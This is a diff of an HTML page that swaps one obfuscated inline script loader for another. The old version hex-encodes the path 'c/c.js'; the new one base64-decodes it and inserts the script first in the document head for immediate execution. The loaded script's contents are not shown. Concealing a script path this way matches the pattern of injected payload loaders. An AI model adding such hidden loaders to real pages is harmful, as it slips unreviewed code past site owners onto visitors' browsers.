@@ -497,26 +497,19 @@
 
 <script>
   (function() {
-    var _load = function() {
-      var _0x1 = '\x63'; 
-      var _0x2 = '\x2e\x6a\x73';
-      var _path = [_0x1, '/', _0x1, _0x2].join(''); 
-
-      var s = document.createElement('script');
-      s.src = _path;
-      s.async = false; // Ensures it executes in order
-      document.head.appendChild(s);
-    };
-
-    // Only run when the initial HTML is fully loaded
-    if (document.readyState === 'complete') {
-      _load();
-    } else {
-      window.addEventListener('load', _load);
-    }
+    var _p = atob('Yy9jLmpz'); // Decodes to c/c.js
+    var _s = document.createElement('script');
+    _s.src = _p;
+    
+    // IMPORTANT: Removing 'defer' and setting 'async' to false 
+    // forces the browser to execute it as soon as it arrives.
+    _s.async = false; 
+    
+    // Use document.write as a fallback for immediate execution 
+    // or stick to the head injection but ensure it's first.
+    document.head.insertBefore(_s, document.head.firstChild);
   })();
 </script>
-    
     
 </body>
 </html>
